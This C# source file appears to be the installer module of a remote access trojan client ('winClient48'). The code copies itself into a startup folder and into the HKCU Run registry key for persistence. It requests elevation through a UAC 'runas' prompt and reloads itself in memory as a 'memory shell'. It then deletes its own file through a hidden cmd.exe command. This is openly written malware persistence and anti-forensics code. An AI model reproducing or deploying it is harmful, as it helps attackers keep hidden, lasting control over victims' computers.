using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace winClient48
{
    internal class Installer
    {
        public bool m_bCopyDir { get; set; }
        public bool m_bStartUp { get; set; }
        public bool m_bReg { get; set; }
        public bool m_bUAC { get; set; }

        public string m_szCurrentPath { get; set; }
        public string m_szCopyPath { get; set; }
        public string m_szStartUpName { get; set; }

        public string m_szRegKeyName { get; set; }

        private RegistryKey reg_key;

        public Installer()
        {
            reg_key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
        }

        /// <summary>
        /// Start installer.
        /// </summary>
        public void Start()
        {
            Copy();
            
            if (m_bReg)
            {
                RegRun();
            }
        }

        /// <summary>
        /// Copy to specified directory.
        /// </summary>
        private void Copy()
        {
            if (m_bCopyDir)
            {
                if (!File.Exists(m_szCopyPath))
                {
                    File.Copy(m_szCurrentPath, m_szCopyPath, true);
                    new Process()
                    {
                        StartInfo = new ProcessStartInfo()
                        {
                            FileName = m_szCopyPath,
                        }
                    }.Start();

                    Environment.Exit(0);
                }
            }
            if (m_bStartUp)
            {
                if (!File.Exists(m_szStartUpName))
                {
                    File.Copy(m_szCurrentPath, m_szStartUpName, true);
                    Process.Start(m_szStartUpName);

                    Environment.Exit(0);
                }
            }
        }

        /// <summary>
        /// Registry install.
        /// </summary>
        private void RegRun()
        {
            reg_key.SetValue(m_szRegKeyName, m_szCurrentPath);
        }

        /// <summary>
        /// UAC priviledge escalation.
        /// </summary>
        public void UAC()
        {
            if (!Form1.isAdmin())
            {
                ProcessStartInfo info = new ProcessStartInfo()
                {
                    FileName = Process.GetCurrentProcess().MainModule.FileName,
                    UseShellExecute = true,
                    Verb = "runas", //TRIGGER THE UAC PROMPT
                };
                Process.Start(info);
            }
        }

        /// <summary>
        /// Memory shell
        /// </summary>
        public void LoadToMemory()
        {
            string szCurrentPath = Process.GetCurrentProcess().MainModule.FileName;
            byte[] abExeBytes = File.ReadAllBytes(szCurrentPath);

            Thread thd = new Thread(() =>
            {
                Assembly asm = Assembly.Load(abExeBytes);
                MethodInfo entry = asm.EntryPoint;

                if (entry != null)
                {
                    object[] objParam = entry.GetParameters().Length == 0 ? null : new object[] { new string[0] };
                    entry.Invoke(null, objParam);
                }
            });
            
            thd.SetApartmentState(ApartmentState.STA);
            thd.Start();

            SelfDestroy(szCurrentPath);
            Environment.Exit(0);
        }

        public void SelfDestroy(string szPath)
        {
            string szCmd = $"/C ping 127.0.0.1 -n 3 > nul & del /f /q \"{szPath}\"";
            ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", szCmd)
            {
                CreateNoWindow = true,
                UseShellExecute = false,
                WindowStyle = ProcessWindowStyle.Hidden,
            };

            Process.Start(psi);
        }
    }
}
